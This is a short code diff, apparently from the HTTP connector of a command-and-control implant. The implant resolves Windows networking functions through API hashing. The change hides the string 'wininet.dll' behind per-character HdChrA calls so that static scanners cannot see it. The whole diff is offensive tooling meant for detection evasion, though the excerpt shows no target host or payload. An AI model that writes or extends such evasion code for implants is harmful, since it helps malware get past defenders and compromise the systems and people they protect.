@@ -44,7 +44,20 @@ ConnectorHTTP::ConnectorHTTP()
 	this->functions->LoadLibraryA = ApiWin->LoadLibraryA;
 	this->functions->GetLastError = ApiWin->GetLastError;
 
-	CHAR wininet_c[] = { 'w', 'i', 'n', 'i', 'n', 'e', 't', '.', 'd', 'l', 'l', 0 };
+	CHAR wininet_c[12];
+	wininet_c[0] = HdChrA('w');
+	wininet_c[1] = HdChrA('i');
+	wininet_c[2] = HdChrA('n');
+	wininet_c[3] = HdChrA('i');
+	wininet_c[4] = HdChrA('n');
+	wininet_c[5] = HdChrA('e');
+	wininet_c[6] = HdChrA('t');
+	wininet_c[7] = HdChrA('.');
+	wininet_c[8] = HdChrA('d');
+	wininet_c[9] = HdChrA('l');
+	wininet_c[10] = HdChrA('l');
+	wininet_c[11] = HdChrA(0);
+
 	HMODULE hWininetModule = this->functions->LoadLibraryA(wininet_c);
 	if (hWininetModule) {
 		this->functions->InternetOpenA              = (decltype(InternetOpenA)*)			  GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETOPENA);
